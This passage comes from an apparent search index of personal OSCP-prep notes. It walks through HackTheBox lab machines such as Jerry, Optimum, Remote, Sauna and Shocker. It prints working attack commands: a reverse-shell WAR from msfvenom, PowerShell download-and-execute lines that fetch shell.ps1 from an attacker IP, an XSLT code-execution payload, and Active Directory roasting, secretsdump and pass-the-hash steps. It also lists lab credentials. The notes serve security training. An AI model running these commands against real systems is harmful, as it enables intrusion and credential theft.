firefox. 2. Copy the file down 3. Strings dump-file | grep login_password 4. Now we have the admin password.</p> <p></p> <pre><code>admin@support.htb\n</code></pre> <pre><code>4dD!5}x/re8]FBuZ\n</code></pre> <p>Then we use crackmapexec to password spray the newly found password against our list of users obtained from the RID bruteforce. </p> <pre><code>crackmapexec smb 10.10.10.149 -u users -p '4dD!5}x/re8]FBuZ'\n</code></pre> <p>This is the admin password! And we can execute commands</p> <p></p> <p>then we spawn a shell using evil-winrm</p> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Jerry/","title":"Jerry","text":"<p>10.10.10.95</p> <p>port 8080 is running apache tomcat 7.0.88</p> <p>Dirbuster found <code>/manager</code> and we were able to login with <code>tomcat:s3cret</code></p> <p>Hunterbot told me about war files.</p> <p>We generate a war file</p> <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f war -o shell.war\n</code></pre> <p>then upload it</p> <p>when we visit <code>/shell</code> we get a connection on our listener</p> <p>Then we found the flags were both in one file:</p> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Lame/","title":"Lame","text":""},{"location":"OSCP-Prep/HackTheBox/Lame/#recon","title":"Recon","text":"<p>Tags for this box are:  </p> <ul> <li>injection</li> <li>cms exploit</li> </ul> <p>Difficulty:  </p> <p>Easy</p>"},{"location":"OSCP-Prep/HackTheBox/Lame/#port-scan","title":"Port Scan","text":"<pre><code>21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian \n139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nAggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%)\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Lame/#exploitation","title":"Exploitation","text":"<p>I decided to start with the odd service I hadn't seen before: distcc.</p> <p>Hacktricks recommended checking if the metasploit module <code>exploit/unix/misc/distcc_exec</code> is applicable. Sure enough, I got a daemon account with this exploit. Thanks again HackTricks (all praise the xyz tld!)</p> <p> user <code>ebe6a4bdd37d05257c96607fb05b4486</code></p>"},{"location":"OSCP-Prep/HackTheBox/Lame/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"OSCP-Prep/HackTheBox/Lame/#users","title":"Users","text":""},{"location":"OSCP-Prep/HackTheBox/Lame/#listening-ports","title":"Listening ports","text":""},{"location":"OSCP-Prep/HackTheBox/Lame/#local-port-scan","title":"Local port scan","text":"<p><code>nmap -sV -T5 127.0.0.1</code></p> <pre><code>Starting Nmap 4.53 ( http://insecure.org ) at 2021-11-09 23:19 EST\nwho\nInteresting ports on localhost (127.0.0.1):\nNot shown: 1691 closed ports\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n23/tcp   open  telnet      Linux telnetd\n25/tcp   open  smtp        Postfix smtpd\n53/tcp   open  domain\n80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)\n111/tcp  open  rpcbind      2 (rpc #100000)\n139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)\n512/tcp  open  exec?\n513/tcp  open  rlogin\n514/tcp  open  tcpwrapped\n953/tcp  open  rndc?\n1524/tcp open  ingreslock?\n2049/tcp open  nfs          2-4 (rpc #100003)\n2121/tcp open  ftp         ProFTPD 1.3.1\n3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\n5432/tcp open  postgresql  PostgreSQL DB\n5900/tcp open  vnc         VNC (protocol 3.3)\n6000/tcp open  X11          (access denied)\n6667/tcp open  irc         Unreal ircd\n8009/tcp open  ajp13?\n</code></pre> <p>At this point I was stuck. I came back to this box later and was able to get root with the pictured metasploit module. Can't quite remember if I found this myself or looked into a write-up. Reminder to update this page if I find notes from this session.</p> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Lame/#reflectcompare","title":"Reflect/Compare","text":"<p>In the official write-up for this box, everything was identical except the exploitation. We both started with a full portscan, however I took a more arbirary route during exploitation; instead of working through the ports top-down, I just picked an interesting service I hadn't seen before.</p> <p>My exploit:  </p> <p>Used <code>exploit/unix/misc/distcc_exec</code> metasploit modul Which granted  user level access. I was unable to privesc Later, I came back and used  <code>multi/samba/usermap_script</code> Which granted root level access.  </p> <p>HTB Writeup:</p> <p>Use <code>multi/samba/usermap_script</code> Grants root level access  </p>"},{"location":"OSCP-Prep/HackTheBox/Lame/#analysis","title":"Analysis","text":"<p>While <code>distcc_exe</code> granted user level, it was a dead end as I couldn't figure out how to privesc. After this reflection, I'm confident that I 'found' the <code>usermap_script</code> exploit by looking at the writeup. This is a perfect example of the dangers of immediately jumping to an exploit.</p> <p>Lessons Learned:</p> <p>DON'T just run around testing exploits. It wreckless and can lead to dead ends. DO completely enumerate and try to weaponize each vector BEFORE thinking about exploitation.  </p> <p>Exploitation should be closer to the end of my process. Put off exploitation attempts until I'm confident I have fully enumerated services/applications.</p>"},{"location":"OSCP-Prep/HackTheBox/Legacy/","title":"Legacy","text":""},{"location":"OSCP-Prep/HackTheBox/Legacy/#recon","title":"Recon","text":"<p>Tags for this box are:</p> <ul> <li>Windows</li> <li>Injection</li> </ul> <p>Difficulty:</p> <p>Easy  </p> <p>A port scan on shows only 2 open TCP ports: <code>139</code>, and <code>445</code>. Nmap guessed the OS was Windows XP or similar.</p> <pre><code> PORT     STATE  SERVICE       REASON          VERSION  \n 139/tcp  open   netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn  \n 445/tcp  open   microsoft-ds  syn-ack ttl 127 Windows XP microsoft-ds  \n 3389/tcp closed ms-wbt-server reset ttl 127\n\nAggressive OS guesses: Microsoft Windows XP SP3 (94%)\n</code></pre> <p>A deeper look at port 139 reveals this host has not patched MS17-010 (a.k.a. Eternal Blue)</p> <pre><code>| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|\n|     Disclosure date: 2017-03-14\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Legacy/#exploitation","title":"Exploitation","text":"<p>Since the path was carved so cleanly from the beginning, I chose to use the metasploit module for this one. It's good practice, right?</p> <p></p> <p>user: <code>e69af0e4f443de7e36876fda4ec7644f</code> root: <code>993442d258b0e0ec917cae9e695d5713</code></p>"},{"location":"OSCP-Prep/HackTheBox/Legacy/#reflectcompare","title":"Reflect/Compare","text":"<p>My path:</p> <p>Scanning identified Windows XP hosting smb. Scanning identified missing <code>ms17-010</code> patch (CVE-2017-0143) Metasploit module <code>windows/smb/ms17-010_eternalblue</code> Root  </p> <p>Walkthrough:</p> <p>Scanning identified Windows XP hosting smb. Researched Windows XP vulns - CVE-2008-4250 Metasploit module <code>windows/smb/08_067_netapi</code> Root  </p>"},{"location":"OSCP-Prep/HackTheBox/Legacy/#analysis","title":"Analysis","text":"<p>I did a good job on this one. While we used differenet exploits, the path is generally the same. There are likely many other exploits that would have worked to root this box.</p>"},{"location":"OSCP-Prep/HackTheBox/Mirai/","title":"Mirai","text":"<p>10.10.10.48</p> <p>A port scan reveals ports 22 and 80 open.</p> <p>Going to port 80 reveals this is a PiHole server. We can assume it's running on a raspberry pi and try the default credentials for ssh which are</p> <p>user: pi password: raspberry</p> <p>This gets us a shell as the <code>pi</code> user. We always run <code>sudo -l</code> to see permissions once we get on the box, and to our suprise we can run everything. So we do <code>sudo su</code> and we are now ROOT.</p>"},{"location":"OSCP-Prep/HackTheBox/Mirai/#user-flag","title":"User Flag","text":"<p>We find the user flag <code>/home/pi/Desktop/user.txt</code></p>"},{"location":"OSCP-Prep/HackTheBox/Mirai/#root-flag","title":"Root Flag","text":"<p>However, the root flag <code>/root/root.txt</code> is not actually a flag. It just says the OG file went missing and to check the USB stick.</p> <p>Using <code>df -h</code> we are able to see the usbstick mounted at <code>/media/usbstick</code></p> <p>We find <code>/media/usbstick/damnit.txt</code>, which says </p> <p>Damnit! Sorry man I accidentally deleted your files off the USB stick. Do you know if there is any way to get them back?</p> <p>-James</p> <p>I tried a few things before turning to a walkthrough. It looks like the secret to getting the file is to 1. Clone the thumbdrive to a local file</p> <pre><code>sshpass -p raspberry ssh pi@10.10.10.48 \"sudo dd if=/dev/sdb | gzip -1 -\" | dd of=usb.gz\n</code></pre> <ol> <li>Extract the file</li> <li>use <code>extundelete usb --restore-all</code> to recover all deleted files</li> </ol> <p>Then, we find the root flag that was deleted.</p>"},{"location":"OSCP-Prep/HackTheBox/Nibbles/","title":"Nibbles","text":""},{"location":"OSCP-Prep/HackTheBox/Nibbles/#recon","title":"Recon","text":"<p>Tags for this box are:  </p> <ul> <li>File Misconfiguration</li> <li>Web</li> </ul> <p>Difficulty:</p> <p>Easy</p> <p>Port scan shows an Apache webserver running on port 80. The site appears to be a static HTML page. In the HTML comments there is a reference to the <code>/nibbleblog/</code> site.  </p> <p>Feroxbuster agains this directory found <code>/admin/</code> as wel as <code>/admin.php</code> (a login page). </p>"},{"location":"OSCP-Prep/HackTheBox/Nibbles/#exploitation","title":"Exploitation","text":"<p>Searched for \"nibbles\" in metasploit and found <code>exploit/multi/http/nibbleblog_file_upload</code> This exploit matches our target application's version. Unfortunately, this exploit requires authentication.</p>"},{"location":"OSCP-Prep/HackTheBox/Nibbles/#getting-help","title":"Getting help","text":"<p>Getting credentials had me stuck. I tried SQL injections and bruteforce. I reviewed the enumeration material multiple times to make sure I wasn't missing something. Finally I looked at a walkthrough. The author of the walkthrough was struggling too and he ended up just guessing the name of the box as the password. Turns out the password is the name of the box.</p> <p>User: <code>admin</code> pass: <code>nibbles</code></p> <p>With credentials in hand, the nibbleblog exploit grants a shell as a normal user.</p>"},{"location":"OSCP-Prep/HackTheBox/Nibbles/#privilege-escalation","title":"Privilege Escalation","text":"<p>The host is running Ubuntu 16.04.3. When searched in metasploit there is the following module: <code>exploit/linux/local/bpf_sign_extension_priv_esc</code> which grants root access.</p>"},{"location":"OSCP-Prep/HackTheBox/Nibbles/#reflectcompare","title":"Reflect/Compare","text":"<p>Both paths were mostly the same at first:</p> <p>Scan identified Apache:80 HTML comments disclosed <code>/nibbleblog/</code> site Feroxbuster found <code>/admin.php</code> logon page. Found <code>multi/http/nibbleblog_file_upload</code> </p> <p>This is where we split My path:</p> <p>Got creds from walkthrough. <code>nibbleblog_file_upload</code> grants user access.  Found <code>linux/local/bpf_sign_extension_priv_esc</code>  by searching for PE on Ubuntu 16.04.3  grans root access.  </p> <p>HTB writeup:</p> <p>Guessed the correct password <code>nibbleblog_file_upload</code> grants user access <code>sudo -l</code> revealed the ability to run <code>/home/nibbler/personal/stuff/monitor.sh</code> <code>bash -i &gt; monitor.sh</code> <code>sudo monitor.sh</code> grants root  </p>"},{"location":"OSCP-Prep/HackTheBox/Nibbles/#analysis","title":"Analysis","text":"<p>I failed to guess the password (which was the name of the blog). I remember seeing <code>monitor.sh</code> and attempting to exploit it but I wasn't able to get it to work. I think the missing piece here was to create the script on the attack machine then upload to the victim - I was trying to create the script on the victim, which wasn't working.</p>"},{"location":"OSCP-Prep/HackTheBox/Nibbles/#lessons-learned","title":"Lessons Learned","text":"<p>Sometimes you can upload a file but not create one. If I focused more on the CyberKillchain, maybe this would have fell under \"delivery\" and I would have seen the other channel (upload vs direct write.)  </p>"},{"location":"OSCP-Prep/HackTheBox/Optimum/","title":"Optimum","text":"<p>10.10.10.8</p> <p>Nmap discovers the only port open is port 80.</p> <p>It's running HttpFileServer 2.3 </p> <p>Using EDB-39161 we are able to get a reverse shell as kostas.</p> <p>Winpeas found kostas' password </p> <pre><code>kdeEjDowkS*\n</code></pre> <p>Upgrade to a powershell shell so we can run sherlock:</p> <pre><code>powershell -c \"IEX (new-object net.webclient).downloadstring('http://10.10.16.4:80/shell.ps1')\"\n</code></pre> <p>Then we load and run sherlock. It looks like the system is vulnerable to MS16-032</p> <p>Unfortunately our shell is running in a 32bit process, so we need to drop the shell and upgrade it by running powershell naitive:</p> <pre><code>http://10.10.10.8/?search=%00{.+exec|C%3a\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe%20IEX%20(new-object%20net.webclient).downloadstring(%27http://10.10.16.4:80/shell.ps1%27)%22+.}\n</code></pre> <p>Now we're running a 64 bit process and can run the exploit:</p> <pre><code>IEX (new-object net.webclient).downloadstring('http://10.10.16.4:80/MS16-032.ps1')\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Remote/","title":"Remote","text":"<p>We find a network file system </p> <p>Make a directory for it</p> <pre><code>mkdir site_backups\n</code></pre> <p>and mount it</p> <pre><code>sudo mount -t nfs \n</code></pre> <p>There are a bunch of files. These appear to be the backup files for umbro CMS.</p> <p></p> <p>We find some interesting content in App_data/Umbraco.sdf</p> <pre><code>strings Umbraco.sdf | head -n 20\n</code></pre> <pre><code>Administratoradmindefaulten-US                                                                                 \nAdministratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d                                             \nAdministratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d\nadminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50\nadminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f\nsmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={\"hashAlgorithm\":\"HMACSHA256\"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e\nssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={\"hashAlgorithm\":\"HMACSHA256\"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749\nssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={\"hashAlgorithm\":\"HMACSHA256\"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32\n</code></pre> <p>We have the following username/hash combos</p> <pre><code>admin:b8be16afba8c314ad33d812f22a04991b90e2aaa (SHA1)\nsmith:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= (HMACSHA256)\nssmith:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= (HMACSHA256)\n\n</code></pre> <p>We're able to crack admin's hash using crackstation </p> <p><code>admin:baconandcheese</code></p> <p>We can now log in, but need to use the admin's email: <code>admin@htb.local</code></p> <p>Now we can use EDB-49488 which grants RCE through Umbraco with credentials.</p> <pre><code>python3 49488.py -u admin@htb.local -p baconandcheese -i http://remote:80/ -c whoami\n</code></pre> <p></p> <p>This exploit seemed limited, so I switched to a similar exploit EDB-46153</p> <p>We had to make a few changes to the exploit, those are highlighted in yellow. This payload will ping our machine, we watch with Wireshark to verify RCE</p> <p></p> <p>It works!</p> <p></p> <p>Then use inmemory injection to run a Powershell reverse shell.</p> <p>We use this powershell script: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p> <p>with this line added at the end</p> <pre><code>Invoke-PowershellTcp -Reverse -IPAddress 10.10.16.4 -Port 4444\n</code></pre> <p>and name the file <code>shell.ps1</code></p> <p>Now update our exploit payload, a few notes: - I was getting errors and felt like it was related to the quotes so I surrounded teh whole payload in trip quotes <code>\"\"\"</code></p> <pre><code>payload = \"\"\"&lt;?xml version=\"1.0\"?&gt;&lt;xsl:stylesheet version=\"1.0\" \\\nxmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" \\\nxmlns:csharp_user=\"http://csharp.mycompany.com/mynamespace\"&gt;\\\n&lt;msxsl:script language=\"C#\" implements-prefix=\"csharp_user\"&gt;public string xml() \\\n{ string cmd = \"IEX (new-object net.webclient).downloadstring('http://10.10.16.4:443/shell.ps1')\"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\\n proc.StartInfo.FileName = \"powershell\"; proc.StartInfo.Arguments = cmd;\\\n proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\\n proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\\n &lt;/msxsl:script&gt;&lt;xsl:template match=\"/\"&gt; &lt;xsl:value-of select=\"csharp_user:xml()\"/&gt;\\\n &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; \"\"\";\n\nlogin = \"admin@htb.local\";\npassword=\"baconandcheese\";\nhost = \"http://10.10.10.180:80\";\n\n</code></pre> <p>this gives us a shell. We see the user has SeImpersonatePrivilege Enabled.</p> <p> and the only other user worth going after is <code>Administrator</code></p> <p></p> <p>We can use <code>post/windows/gather/credentials/teamviewer_passwords</code> in metasploit, but it requires a valid meterpreter session. </p> <p>Lets generate a meterpreter payload, copy it over, and get a session up.</p> <p>Now we run the command and get a password</p> <p></p> <p>lets try that as Administrator's password:</p> <p>It works, AAND we can use smb to get a shell.</p> <p></p> <p>We'll specify the same powershell command we used earlier to get a shell.</p> <pre><code>crackmapexec smb 10.10.10.180 -u Administrator -p '!R3m0te!' -X \"IEX (new-object net.webclient).downloadstring('http://10.10.16.4:443/shell.ps1')\"\n</code></pre> <p>It worked!</p> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Sauna/","title":"Sauna","text":"<p>IP</p> <pre><code>10.10.10.175\n</code></pre> <pre><code>53/tcp   open  domain?       syn-ack ttl 127\n80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Egotistical Bank :: Home\n| http-methods:\n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-12 10:10:00Z)\n135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site:\nDefault-First-Site-Name)\n445/tcp  open  microsoft-ds? syn-ack ttl 127\n464/tcp  open  kpasswd5?     syn-ack ttl 127\n593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped    syn-ack ttl 127\n3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site:\nDefault-First-Site-Name)\n3269/tcp open  tcpwrapped    syn-ack ttl 127\n\n</code></pre> <p>LDAP search returns a user's name.</p> <p></p> <p>We found his username is <code>hsmith</code></p> <p></p> <p>we did more user enumeration with</p> <pre><code>kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local /usr/share/seclists/Usernames/userlist.txt\n</code></pre> <p>we found a new user: <code>fsmith</code> and used the following command to get an AS-REP hash</p> <pre><code>GetNPUsers.py egotistical-bank.local/ -usersfile users -format hashcat -outputfile as-rep.hash\n</code></pre> <p>we then cracked using hashcat</p> <pre><code>hashcat as-rep.hash /usr/share/wordlists/rockyou.txt\n</code></pre> <pre><code>fsmith\n</code></pre> <pre><code>Thestrokes23\n</code></pre> <p>we logged in using evil-winrm</p> <pre><code>evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175\n</code></pre> <p>and found the user flag on the desktop</p> <p></p> <p>we ran winpeas and found another set of credentials</p> <p></p> <p>However, this user didn't appear to be valid, but we found a similar user and this password worked!</p> <pre><code>svc_loanmgr\n</code></pre> <pre><code>Moneymakestheworldgoround!\n</code></pre> <p>We then used the python bloodhound ingestor to collect domain info</p> <pre><code>bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d Egotistical-bank.local -dc 10.10.10.175 -c All\n</code></pre> <p>We loaded the .json files into bloodhound.</p> <p>Found out our <code>svc_loanmgr</code> account has DCSync privileges.</p> <p>We dumped secrets with <code>secretesdump.py</code></p> <pre><code>secretsdump.py -dc-ip 10.10.10.175 egotistical-bank.local/svc_loanmgr@10.10.10.175\n</code></pre> <p>which gave the following hashes</p> <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::                                        \nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                \nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::                                               \nEGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::                       \nEGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::                       \nEGOTISTICAL-BANK.LOCAL\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::                  \nSAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:cba7484ad743db3e4f1e6feb311f44d6:::\n</code></pre> <p>We are able to login as <code>Administrator</code> using the PTH function of evil-winrm</p> <pre><code>evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Sauna/#root-flag","title":"Root flag","text":""},{"location":"OSCP-Prep/HackTheBox/Search/","title":"Search","text":"<pre><code>10.10.11.129\n</code></pre> <p>Hostname: <code>RESEARCH</code> Domain name: <code>search.htb</code></p> <p>kerbrute found some valid user names:</p> <pre><code>administrator@search.htb\nresearch@search.htb\n</code></pre> <p>Hope Sharp IsolationIsKey?</p> <p>Using different permutations of her name in a wordlist combined with <code>kerbrute</code> we were able to find a valid username of <code>hope.sharp</code></p> <p></p> <p>Then we run bloodhound</p> <pre><code>bloodhound-python -u hope.sharp -p \"IsolationIsKey?\" -d search.htb -ns 10.10.11.129\n</code></pre> <p>we then pull this into bloodhound and find an account that is vulnerable to AS-REP Roasting</p> <pre><code>GetUserSPNs.py search.htb/hope.sharp:\"IsolationIsKey?\" -outputfile web_svc_kerberos\n</code></pre> <p>and then crack the hash</p> <pre><code>hashcat web_svc_kerberos /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Which give us the following set of creds.</p> <pre><code>web_svc\n</code></pre> <pre><code>@3ONEmillionbaby\n</code></pre> <p>Now we have a list of users in bloodhound. We did some magic with powershell to extract the usernames:</p> <p>start powershell</p> <pre><code>pwsh\n</code></pre> <p>import the users.json file</p> <pre><code>$json = gc ./20220712232201_users.json | ConvertFrom-Json\n</code></pre> <p>pull out the username and strip the <code>@search.htb</code>, save this to a file <code>users-ad.txt</code></p> <pre><code>$json.data.Properties.name |%{$_.split(\"@\")[0]} | Sort-Object -Unique &gt; users-ad.txt\n</code></pre> <p>Then we check the username list for password reuse:</p> <pre><code>crackmapexec smb search.htb -u users-ad.txt -p \"@3ONEmillionbaby\"\n</code></pre> <p>It looks like <code>EDGAR.JACOBS</code> is using the same password.</p> <p>We then use bloodhound to see what transitive object controlls this user has</p> <p></p> <p>We see Edgar has access to the <code>Helpdesk</code> share</p> <pre><code>crackmapexec smb search.htb -u edgar.jacobs -p \"@3ONEmillionbaby\" --shares\n</code></pre> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/","title":"Shocker","text":""},{"location":"OSCP-Prep/HackTheBox/Shocker/#recon","title":"Recon","text":"<p>Tags for this box are: </p> <ul> <li>Perl</li> <li>Injection</li> <li>Web</li> </ul> <p>Difficulty:</p> <p>Easy</p> <p>Only 2 ports exposed: 2222 (ssh), and 80 (apache)</p> <p>The running version of SSH doesn't have any public exploits, so it seems pretty obvious the target will be a website for this challenge.</p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#enumeration","title":"Enumeration","text":"<p>Nothing stood out from the scanning docs. I had to step back and really ask myself some fundamental questions to move forward on this one.</p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#what-does-it-do","title":"What does it do?","text":"<p>I've only been able to see the homepage <code>index.html</code> which appears to be a static page with a picture of a bug about to squash itself.</p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#what-language-is-it-written-in","title":"What language is it written in?","text":"<p>Based on some feroxbuster output (403 errors) the site seems to have the following filetypes <code>aspx</code>, <code>asp</code>, <code>jsp</code>, <code>php</code>.</p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#what-server-software-is-the-application-running-on","title":"What server software is the application running on?","text":"<p>Apache httpd 2.4.18 (Ubuntu)</p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#getting-help","title":"Getting help","text":"<p>I peaked at the walkthrough because I was lost. No shocker - this machine was built to practice shellshock.  </p> <p>On apache, the <code>cgi-bin</code> folder contains scripts. The scripts are accessed via web, run server side, then returned with an HTTP reply. Shellshock provides input that hijacks the server-side shell run. I also saw in the walkthrough that the target script is <code>/cgi-bin/user.sh</code>. </p> <p>But I want to prove this with a scan.</p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#fuzzing-for-shellshock","title":"fuzzing for shellshock","text":"<p>Found a shellshock endpoint by running</p> <pre><code>feroxbuster -u http://10.10.10.56:80/cgi-bin/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x \"sh\" -v -k -n -o /home/nate/hackthebox/shocker/results/scans/tcp80/tcp_80_http_feroxbuster_cgi-bin.txt\n</code></pre> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#exploitation","title":"Exploitation","text":"<p>I was able to get user.txt but not enough privs for root.txt</p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"OSCP-Prep/HackTheBox/Shocker/#linpeas-findings","title":"Linpeas findings","text":"<p>Sudo version 1.8.16</p> <p>\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Executing Linux Exploit Suggester 2 \u255a https://github.com/jondonas/linux-exploit-suggester-2  </p> <p>[1] af_packet   CVE-2016-8655   Source: http://www.exploit-db.com/exploits/40871 [2] exploit_x   CVE-2018-14665   Source: http://www.exploit-db.com/exploits/45697 [3] get_rekt   CVE-2017-16695   Source: http://www.exploit-db.com/exploits/45010  </p> <p>\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d \u255ahttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  </p> <p>User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl </p> <p>Might be able to use the following from GTFO bins to get root.</p> <pre><code>sudo perl -e 'exec \"/bin/sh\";'\n</code></pre> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#reflectcompare","title":"Reflect/Compare","text":"<p>My Path:  </p> <p>Scan finds Apache <code>2.4.18</code> on port 80 Looked at walkthrough Fuzz /cgi-bin/ to find endpoint vulnerable to Shellshock. Send webrequest with malicious header. Got User User can run <code>perl</code> as sudo GTFO bins for <code>SUDO</code> and <code>perl</code> Root</p> <p>HTB Walkthrough:</p> <p>Scan finds Apache on port 80 Fuzzed and found <code>cgi-bin</code> directory Knows they're exploiting shellshock (box name + cgi-bin) Fuzzed <code>/cgi-bin/</code> for <code>.sh</code>,<code>.py</code>, and other scripting extensions Find <code>user.sh</code> Use metasploit <code>/multi/http/apache_mod_cgi_bash_env_exec</code> Got User Found <code>perl</code> NOPASSWD entry. Root</p>"},{"location":"OSCP-Prep/HackTheBox/Shocker/#analysis","title":"Analysis","text":"<p>There's no reason I should have looked at the writeup on this one, I'm a bit ashamed. I knew the Apache version and could see the needed exploit from EDB (using searchsploit). Based on the name of the box I figured it would require exploiting shellshock - but this was my first experience with 